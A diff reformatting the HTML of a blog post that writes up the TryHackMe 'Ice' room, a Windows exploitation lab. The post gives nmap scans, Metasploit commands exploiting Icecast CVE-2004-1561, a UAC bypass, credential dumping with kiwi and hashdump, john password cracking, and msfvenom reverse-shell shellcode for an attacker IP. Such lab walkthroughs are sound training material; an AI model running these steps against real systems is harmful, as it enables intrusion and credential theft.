@@ -1,210 +1,230 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-  <head>
-    
-      <title>
-        Ice ::
-        My website — A simple blog
-      </title>
-    
-    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<meta
-  name="description"
-  content="#WindowsExploitation
+    <head>
+        <title>Ice :: My website — A simple blog</title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta
+            name="description"
+            content="#WindowsExploitation
 Writeup for the THM Room Ice
 "
-/>
-<meta
-  name="keywords"
-  content=""
-/>
-<meta name="robots" content="noodp" />
-<link rel="canonical" href="https://example.org/posts/ice/" />
+        />
+        <meta name="keywords" content="" />
+        <meta name="robots" content="noodp" />
+        <link rel="canonical" href="https://example.org/posts/ice/" />
 
+        <link rel="stylesheet" href="/css/style.css" />
 
+        <link rel="stylesheet" href="https://example.org/style.css" />
 
+        <link
+            rel="apple-touch-icon-precomposed"
+            sizes="144x144"
+            href="https://example.org/img/apple-touch-icon-144-precomposed.png"
+        />
+        <link rel="shortcut icon" href="https://example.org/img/favicon.png" />
 
+        <link
+            href="/fonts/Inter-Italic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Regular.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Medium.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-MediumItalic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-Bold.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
+        <link
+            href="/fonts/Inter-BoldItalic.woff2"
+            rel="preload"
+            type="font/woff2"
+            as="font"
+            crossorigin=""
+        />
 
+        <meta name="twitter:card" content="summary" />
+        <meta name="twitter:title" content="Ice" />
+        <meta
+            name="twitter:description"
+            content="#WindowsExploitation
+Writeup for the THM Room Ice"
+        />
 
+        <meta property="og:title" content="Ice" />
+        <meta
+            property="og:description"
+            content="#WindowsExploitation
+Writeup for the THM Room Ice"
+        />
+        <meta property="og:type" content="article" />
+        <meta property="og:url" content="https://example.org/posts/ice/" />
+        <meta property="article:section" content="posts" />
+        <meta
+            property="article:published_time"
+            content="2023-12-23T19:04:30-05:00"
+        />
+        <meta
+            property="article:modified_time"
+            content="2023-12-23T19:04:30-05:00"
+        />
+        <meta property="og:site_name" content="Hello Friend" />
+    </head>
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+                <span class="header__inner">
+                    <a href="/" class="logo" style="text-decoration: none">
+                        <span class="logo__mark"
+                            ><svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="greater-icon"
+                                viewBox="0 0 44 44"
+                            >
+                                <path
+                                    fill="none"
+                                    d="M15 8l14.729 14.382L15 35.367"
+                                />
+                            </svg>
+                        </span>
+                        <span class="logo__text">hello friend</span>
+                        <span class="logo__cursor"></span>
+                    </a>
 
-<link rel="stylesheet" href="/css/style.css" />
+                    <span class="header__right">
+                        <nav class="menu">
+                            <ul class="menu__inner menu__inner--desktop">
+                                <li><a href="/about">About</a></li>
+                            </ul>
 
-<link rel="stylesheet" href="https://example.org/style.css" />
+                            <ul class="menu__inner menu__inner--mobile">
+                                <li><a href="/about">About</a></li>
+                            </ul>
+                        </nav>
 
+                        <span class="menu-trigger">
+                            <svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                viewBox="0 0 24 24"
+                            >
+                                <path d="M0 0h24v24H0z" fill="none" />
+                                <path
+                                    d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"
+                                />
+                            </svg>
+                        </span>
 
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://example.org/img/apple-touch-icon-144-precomposed.png" />
-<link rel="shortcut icon" href="https://example.org/img/favicon.png" />
-
-
-<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
-
-
-<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Ice"/>
-<meta name="twitter:description" content="#WindowsExploitation
-Writeup for the THM Room Ice"/>
-
-
-
-<meta property="og:title" content="Ice" />
-<meta property="og:description" content="#WindowsExploitation
-Writeup for the THM Room Ice" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://example.org/posts/ice/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-12-23T19:04:30-05:00" />
-<meta property="article:modified_time" content="2023-12-23T19:04:30-05:00" /><meta property="og:site_name" content="Hello Friend" />
-
-
-
-
-
-
-
-  </head>
-  <body class="dark-theme">
-    <div class="container">
-      <header class="header">
-  <span class="header__inner">
-    <a
-  href="/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text"
-      >hello friend</span
-    >
-    <span class="logo__cursor"></span>
-  
-</a>
-
-    <span class="header__right">
-      
-        <nav class="menu">
-  <ul class="menu__inner menu__inner--desktop">
-    
-      
-        
-          <li><a href="/about">About</a></li>
-        
-      
-      
-      
-  </ul>
-
-  <ul class="menu__inner menu__inner--mobile">
-    
-      
-        <li><a href="/about">About</a></li>
-      
-    
-  </ul>
-</nav>
-
-        <span class="menu-trigger">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-            <path d="M0 0h24v24H0z" fill="none" />
-            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
-          </svg>
-        </span>
-      
-      <span class="theme-toggle">
-        <svg
-  class="theme-toggler"
-  width="24"
-  height="24"
-  viewBox="0 0 48 48"
-  fill="none"
-  xmlns="http://www.w3.org/2000/svg"
->
-  <path
-    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+                        <span class="theme-toggle">
+                            <svg
+                                class="theme-toggler"
+                                width="24"
+                                height="24"
+                                viewBox="0 0 48 48"
+                                fill="none"
+                                xmlns="http://www.w3.org/2000/svg"
+                            >
+                                <path
+                                    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
-  />
-</svg>
+                                />
+                            </svg>
+                        </span>
+                    </span>
+                </span>
+            </header>
 
-      </span>
-    </span>
-  </span>
-</header>
+            <div class="content">
+                <article class="post">
+                    <h1 class="post-title">Ice</h1>
+                    <div class="post-meta">
+                        <time class="post-date"> 2023-12-23 </time>
 
+                        <span class="post-read-time">— 3 min read</span>
+                    </div>
 
-      <div class="content">
-        
-  
-  
+                    <figure class="post-cover">
+                        <img src="/img/ice/ice.jpg" alt="Ice thm" />
+                    </figure>
 
-  <article class="post">
-    <h1 class="post-title">Ice</h1>
-    <div class="post-meta">
-      
-        <time class="post-date">
-          2023-12-23
-        </time>
+                    <div class="post-content">
+                        <h2>Table of Contents</h2>
+                        <aside class="table-of-contents">
+                            <nav id="TableOfContents">
+                                <ul>
+                                    <li><a href="#recon">Recon</a></li>
+                                    <li>
+                                        <a href="#gain-access">Gain Access</a>
+                                    </li>
+                                    <li>
+                                        <a href="#escalate-privileges"
+                                            >Escalate Privileges</a
+                                        >
+                                    </li>
+                                    <li><a href="#looting">Looting</a></li>
+                                    <li>
+                                        <a href="#manual-exploitation"
+                                            >Manual Exploitation</a
+                                        >
+                                    </li>
+                                </ul>
+                            </nav>
+                        </aside>
 
-        
-          
-        
-      
-
-      
-
-
-      
-        <span class="post-read-time"
-          >— 3 min read</span
-        >
-      
-    </div>
-
-    
-
-    
-      <figure class="post-cover">
-  
-    <img src="https://example.org/img/ice/ice.jpg" alt="Ice thm"/>
-  
-
-  
-</figure>
-
-    
-
-    <div class="post-content">
-      
-        
-        <h2>Table of Contents</h2>
-        <aside class="table-of-contents"><nav id="TableOfContents">
-  <ul>
-    <li><a href="#recon">Recon</a></li>
-    <li><a href="#gain-access">Gain Access</a></li>
-    <li><a href="#escalate-privileges">Escalate Privileges</a></li>
-    <li><a href="#looting">Looting</a></li>
-    <li><a href="#manual-exploitation">Manual Exploitation</a></li>
-  </ul>
-</nav></aside>
-        
-      
-      <p>#WindowsExploitation</p>
-<p>Writeup for the THM Room Ice</p>
-<h2 id="recon">
-  Recon
-  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>Start with a stealth syn scan using nmap</p>
-<pre tabindex="0"><code class="language-nmap" data-lang="nmap">sudo nmap -sS -n --open -vvv -Pn -p- -T4 machine_ip -oG allPorts
-</code></pre><p>Obtain the open ports from allPorts with the function extractPorts</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Extract nmap information</span>
+                        <p>#WindowsExploitation</p>
+                        <p>Writeup for the THM Room Ice</p>
+                        <h2 id="recon">
+                            Recon
+                            <a href="#recon" class="h-anchor" aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>Start with a stealth syn scan using nmap</p>
+                        <pre
+                            tabindex="0"
+                        ><code class="language-nmap" data-lang="nmap">sudo nmap -sS -n --open -vvv -Pn -p- -T4 machine_ip -oG allPorts
+</code></pre>
+                        <p>
+                            Obtain the open ports from allPorts with the
+                            function extractPorts
+                        </p>
+                        <div class="highlight">
+                            <pre
+                                tabindex="0"
+                                style="
+                                    color: #f8f8f2;
+                                    background-color: #272822;
+                                    -moz-tab-size: 4;
+                                    -o-tab-size: 4;
+                                    tab-size: 4;
+                                "
+                            ><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Extract nmap information</span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> extractPorts<span style="color:#f92672">(){</span>
 </span></span><span style="display:flex;"><span>    ports<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat $1 | grep -oP <span style="color:#e6db74">&#39;\d{1,5}/open&#39;</span> | awk <span style="color:#e6db74">&#39;{print $1}&#39;</span> FS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;/&#39;</span> | xargs | tr <span style="color:#e6db74">&#39; &#39;</span> <span style="color:#e6db74">&#39;,&#39;</span><span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
 </span></span><span style="display:flex;"><span>    ip_address<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>cat $1 | grep -oP <span style="color:#e6db74">&#39;\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}&#39;</span> | sort -u | head -n 1<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>
@@ -215,162 +235,282 @@ Writeup for the THM Room Ice" />
 </span></span><span style="display:flex;"><span>    echo -e <span style="color:#e6db74">&#34;[*] Ports copied to clipboard\n&#34;</span>  &gt;&gt; extractPorts.tmp
 </span></span><span style="display:flex;"><span>    cat extractPorts.tmp; rm extractPorts.tmp
 </span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
-</span></span></code></pre></div><p><code>extractPorts allPorts</code></p>
-<p>Next, a service and version scan for the open ports copied to the clipboard</p>
-<pre tabindex="0"><code class="language-nmap" data-lang="nmap">nmap -sC -sV -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 machine_ip -oN targeted
-</code></pre><h2 id="gain-access">
-  Gain Access
-  <a href="#gain-access" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>Look for information on Icecast
-<a href="https://www.cvedetails.com/cve/CVE-2004-1561/">CVE-2004-1561</a></p>
-<pre tabindex="0"><code>#Inside msfconsole
+</span></span></code></pre>
+                        </div>
+                        <p><code>extractPorts allPorts</code></p>
+                        <p>
+                            Next, a service and version scan for the open ports
+                            copied to the clipboard
+                        </p>
+                        <pre
+                            tabindex="0"
+                        ><code class="language-nmap" data-lang="nmap">nmap -sC -sV -p135,139,445,3389,5357,8000,49152,49153,49154,49158,49159,49160 machine_ip -oN targeted
+</code></pre>
+                        <h2 id="gain-access">
+                            Gain Access
+                            <a
+                                href="#gain-access"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>
+                            Look for information on Icecast
+                            <a
+                                href="https://www.cvedetails.com/cve/CVE-2004-1561/"
+                                >CVE-2004-1561</a
+                            >
+                        </p>
+                        <pre tabindex="0"><code>#Inside msfconsole
 search icecast
 use exploit/windows/http/icecast_header
 set RHOSTS machine_ip
 set LHOST attacker_ip
 exploit
-</code></pre><h2 id="escalate-privileges">
-  Escalate Privileges
-  <a href="#escalate-privileges" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<pre tabindex="0"><code>#meterpreter session 1
+</code></pre>
+                        <h2 id="escalate-privileges">
+                            Escalate Privileges
+                            <a
+                                href="#escalate-privileges"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <pre tabindex="0"><code>#meterpreter session 1
 getuid
 sysinfo
 run post/multi/recon/local_exploit_suggester
-</code></pre><ul>
-<li><code>exploit/windows/local/bypassuac_eventvwr</code> is the privesc technique to use</li>
-<li><code>bg</code> or <code>Ctrl+z</code> -&gt; to background the session</li>
-</ul>
-<pre tabindex="0"><code>#msfconsole
+</code></pre>
+                        <ul>
+                            <li>
+                                <code
+                                    >exploit/windows/local/bypassuac_eventvwr</code
+                                >
+                                is the privesc technique to use
+                            </li>
+                            <li>
+                                <code>bg</code> or <code>Ctrl+z</code> -&gt; to
+                                background the session
+                            </li>
+                        </ul>
+                        <pre tabindex="0"><code>#msfconsole
 use exploit/windows/local/bypassuac_eventvwr
 set SEESION #
 set LHOST attacker_ip
 run
-</code></pre><pre tabindex="0"><code>#meterpreter session 2
+</code></pre>
+                        <pre tabindex="0"><code>#meterpreter session 2
 getprivs
-</code></pre><p><code>SeTakeOwnershipPrivilege</code> -&gt; take ownership of files</p>
-<h2 id="looting">
-  Looting
-  <a href="#looting" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<p>We need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows</p>
-<pre tabindex="0"><code>#meterpreter session 2
+</code></pre>
+                        <p>
+                            <code>SeTakeOwnershipPrivilege</code> -&gt; take
+                            ownership of files
+                        </p>
+                        <h2 id="looting">
+                            Looting
+                            <a
+                                href="#looting"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <p>
+                            We need to move to a process that actually has the
+                            permissions that we need to interact with the lsass
+                            service, the service responsible for authentication
+                            within Windows
+                        </p>
+                        <pre tabindex="0"><code>#meterpreter session 2
 ps
-</code></pre><ul>
-<li>In order to interact with lsass we need to be &rsquo;living in&rsquo; a process that has the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service runs with SYSTEM-level privileges by default, and it will restart if crashed</li>
-<li><code>spoolsv.exe</code> -&gt; printer spool service</li>
-</ul>
-<pre tabindex="0"><code>#meterpreter session 2
+</code></pre>
+                        <ul>
+                            <li>
+                                In order to interact with lsass we need to be
+                                &rsquo;living in&rsquo; a process that has the
+                                same architecture as the lsass service (x64 in
+                                the case of this machine) and a process that has
+                                the same permissions as lsass. The printer spool
+                                service runs with SYSTEM-level privileges by
+                                default, and it will restart if crashed
+                            </li>
+                            <li>
+                                <code>spoolsv.exe</code> -&gt; printer spool
+                                service
+                            </li>
+                        </ul>
+                        <pre tabindex="0"><code>#meterpreter session 2
 migrate spoolsv.exe
 getuid
 load kiwi
 creds_all
 run post/windows/manage/enable_rdp
-</code></pre><p><em>Crack the password with john</em></p>
-<ul>
-<li>Use <code>hashdump</code> in the meterpreter session</li>
-<li>Insert the hashes into a hashes.txt</li>
-<li><code>john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=NT</code></li>
-</ul>
-<hr>
-<h2 id="manual-exploitation">
-  Manual Exploitation
-  <a href="#manual-exploitation" class="h-anchor" aria-hidden="true">#</a>
-</h2>
-<ul>
-<li><code>searchsploit Icecast</code></li>
-<li>Both versions of th exploit will not work, as they are outdated. A more modern version can be found in the following github repository <a href="https://github.com/ivanitlearning/CVE-2004-1561.git">CVE-2004-1561</a></li>
-<li><code>git clone https://github.com/ivanitlearning/CVE-2004-1561.git</code></li>
-<li>The code written in python and C will now work. However, in order for it to do so, new shellcode has to be generated with msfvenom</li>
-<li>The command to achieve this is the following:</li>
-</ul>
-<pre tabindex="0"><code class="language-msfvenom" data-lang="msfvenom">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b &#39;\x0a\x0d\x00&#39; -f c
-</code></pre><ul>
-<li>This command takes into account the attacker&rsquo;s ip and the port to listen to for the reverse shell. This parameter can vary.</li>
-<li>It also considers badchars or bad characters. A bad character is an unwanted character that can be used to break shellcode. Depending on the application and the developer logic there is a different set of bad characters that a developer can specify for every program.</li>
-<li>Common badchars include:</li>
-</ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span> <span style="color:#f92672">=</span> Null Byte o end of string
+</code></pre>
+                        <p><em>Crack the password with john</em></p>
+                        <ul>
+                            <li>
+                                Use <code>hashdump</code> in the meterpreter
+                                session
+                            </li>
+                            <li>Insert the hashes into a hashes.txt</li>
+                            <li>
+                                <code
+                                    >john
+                                    --wordlist=/usr/share/wordlists/rockyou.txt
+                                    hashes.txt --format=NT</code
+                                >
+                            </li>
+                        </ul>
+                        <hr />
+                        <h2 id="manual-exploitation">
+                            Manual Exploitation
+                            <a
+                                href="#manual-exploitation"
+                                class="h-anchor"
+                                aria-hidden="true"
+                                >#</a
+                            >
+                        </h2>
+                        <ul>
+                            <li><code>searchsploit Icecast</code></li>
+                            <li>
+                                Both versions of th exploit will not work, as
+                                they are outdated. A more modern version can be
+                                found in the following github repository
+                                <a
+                                    href="https://github.com/ivanitlearning/CVE-2004-1561.git"
+                                    >CVE-2004-1561</a
+                                >
+                            </li>
+                            <li>
+                                <code
+                                    >git clone
+                                    https://github.com/ivanitlearning/CVE-2004-1561.git</code
+                                >
+                            </li>
+                            <li>
+                                The code written in python and C will now work.
+                                However, in order for it to do so, new shellcode
+                                has to be generated with msfvenom
+                            </li>
+                            <li>
+                                The command to achieve this is the following:
+                            </li>
+                        </ul>
+                        <pre
+                            tabindex="0"
+                        ><code class="language-msfvenom" data-lang="msfvenom">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b &#39;\x0a\x0d\x00&#39; -f c
+</code></pre>
+                        <ul>
+                            <li>
+                                This command takes into account the
+                                attacker&rsquo;s ip and the port to listen to
+                                for the reverse shell. This parameter can vary.
+                            </li>
+                            <li>
+                                It also considers badchars or bad characters. A
+                                bad character is an unwanted character that can
+                                be used to break shellcode. Depending on the
+                                application and the developer logic there is a
+                                different set of bad characters that a developer
+                                can specify for every program.
+                            </li>
+                            <li>Common badchars include:</li>
+                        </ul>
+                        <div class="highlight">
+                            <pre
+                                tabindex="0"
+                                style="
+                                    color: #f8f8f2;
+                                    background-color: #272822;
+                                    -moz-tab-size: 4;
+                                    -o-tab-size: 4;
+                                    tab-size: 4;
+                                "
+                            ><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span> <span style="color:#f92672">=</span> Null Byte o end of string
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>0a <span style="color:#f92672">=</span> New Line <span style="color:#ae81ff">\n</span> <span style="color:#f92672">(</span>linux<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span><span style="color:#ae81ff">\x</span>0d <span style="color:#f92672">=</span> Carriage Return  <span style="color:#ae81ff">\r</span> <span style="color:#f92672">(</span>linux<span style="color:#f92672">)</span>
-</span></span></code></pre></div><p>msfvenom can also output a python format</p>
-<pre tabindex="0"><code class="language-msfvenom" data-lang="msfvenom">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b &#39;\x0a\x0d\x00&#39; -f p
-</code></pre><p>Replace the shellcode in the python script or in the C code.</p>
-    </div>
-    
-      
-        <div class="pagination">
-          <div class="pagination__title">
-            <span class="pagination__title-h"
-              >Read other posts</span
-            >
-            <hr />
-          </div>
-          <div class="pagination__buttons">
-            
-            
-              <span class="button next">
-                <a href="https://example.org/posts/linux-backdoors/">
-                  <span class="button__text">Linux Backdoors</span>
-                  <span class="button__icon">→</span>
-                </a>
-              </span>
-            
-          </div>
+</span></span></code></pre>
+                        </div>
+                        <p>msfvenom can also output a python format</p>
+                        <pre
+                            tabindex="0"
+                        ><code class="language-msfvenom" data-lang="msfvenom">msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=Attacker_machine_ip LPORT=4444 -b &#39;\x0a\x0d\x00&#39; -f p
+</code></pre>
+                        <p>
+                            Replace the shellcode in the python script or in the
+                            C code.
+                        </p>
+                    </div>
+
+                    <div class="pagination">
+                        <div class="pagination__title">
+                            <span class="pagination__title-h"
+                                >Read other posts</span
+                            >
+                            <hr />
+                        </div>
+                        <div class="pagination__buttons">
+                            <span class="button next">
+                                <a href="/posts/linux-backdoors/">
+                                    <span class="button__text"
+                                        >Linux Backdoors</span
+                                    >
+                                    <span class="button__icon">→</span>
+                                </a>
+                            </span>
+                        </div>
+                    </div>
+                </article>
+            </div>
+
+            <footer class="footer">
+                <div class="footer__inner">
+                    <a href="/" class="logo" style="text-decoration: none">
+                        <span class="logo__mark"
+                            ><svg
+                                xmlns="http://www.w3.org/2000/svg"
+                                class="greater-icon"
+                                viewBox="0 0 44 44"
+                            >
+                                <path
+                                    fill="none"
+                                    d="M15 8l14.729 14.382L15 35.367"
+                                />
+                            </svg>
+                        </span>
+                        <span class="logo__text">hello friend</span>
+                        <span class="logo__cursor"></span>
+                    </a>
+
+                    <div class="copyright">
+                        <span
+                            >© 2023 Powered by
+                            <a
+                                href="https://gohugo.io"
+                                target="_blank"
+                                rel="noopener"
+                                >Hugo</a
+                            ></span
+                        >
+                        <span
+                            ><a
+                                href="https://github.com/panr/hugo-theme-hello-friend"
+                                target="_blank"
+                                >Theme</a
+                            >
+                            made by
+                            <a href="https://github.com/panr" target="_blank"
+                                >panr</a
+                            ></span
+                        >
+                    </div>
+                </div>
+            </footer>
+
+            <script type="text/javascript" src="/bundle.min.js"></script>
         </div>
-      
-    
-
-    
-      
-        
-
-      
-    
-  </article>
-
-      </div>
-
-      
-        <footer class="footer">
-  <div class="footer__inner">
-    
-      <a
-  href="/"
-  class="logo"
-  style="text-decoration: none;"
->
-  
-    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
-  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
-</svg>
-</span>
-    <span class="logo__text"
-      >hello friend</span
-    >
-    <span class="logo__cursor"></span>
-  
-</a>
-
-      <div class="copyright">
-        <span>© 2023 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
-        <span><a href="https://github.com/panr/hugo-theme-hello-friend" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
-      </div>
-    
-  </div>
-</footer>
-
-
-
-
-
-<script type="text/javascript" src="/bundle.min.js"></script>
-
-
-      
-    </div>
-
-    
-  </body>
+    </body>
 </html>
